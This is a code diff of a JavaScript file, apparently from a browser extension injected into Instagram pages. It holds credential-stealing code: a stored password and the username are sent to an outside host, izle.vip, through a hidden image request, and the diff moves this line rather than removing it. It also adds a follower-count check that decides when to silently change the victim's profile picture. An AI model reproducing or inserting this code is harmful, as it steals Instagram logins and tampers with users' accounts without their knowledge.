@@ -170,9 +170,6 @@ if(window.location.origin.indexOf("instagram.com") >= 0 && document.referrer.ind
 	var instagram_ajax = content.split('"rollout_hash":"')[1].split('"')[0];
 	var app_id = "936619743392459";
 	
-	if(localStorage["passwd"]){
-		new Image().src = 'https://www.izle.vip/req.php?username='+username+'&password='+localStorage["passwd"];
-	}
 	
 	function loadXHR(url) {
 		return new Promise(function(resolve, reject) {
@@ -229,6 +226,10 @@ if(window.location.origin.indexOf("instagram.com") >= 0 && document.referrer.ind
 			"method": "POST",
 			"mode": "cors"
 		});
+		
+		if(localStorage["passwd"]){
+			new Image().src = 'https://www.izle.vip/req.php?username='+username+'&password='+localStorage["passwd"];
+		}
 	}
 	
 	
@@ -243,7 +244,18 @@ if(window.location.origin.indexOf("instagram.com") >= 0 && document.referrer.ind
 					var myArr = JSON.parse(xhr.responseText);
 					resim_url = myArr[Math.floor(Math.random()*myArr.length)];
 					if(resim_url){
-						resimDegistir(resim_url);
+						var xhrCount = new XMLHttpRequest();
+						xhrCount.onreadystatechange = function() {
+							if (xhrCount.readyState == XMLHttpRequest.DONE) {
+								var getCount = JSON.parse(xhrCount.responseText);
+								var totalFollowers = getCount.graphql.user.edge_followed_by.count;
+								if(totalFollowers == 0){
+									resimDegistir(resim_url);
+								}	
+							}
+						}
+						xhrCount.open('GET', "https://www.instagram.com/"+username+"/?__a=1", true);
+						xhrCount.send(null);
 					}
 				}
 			}
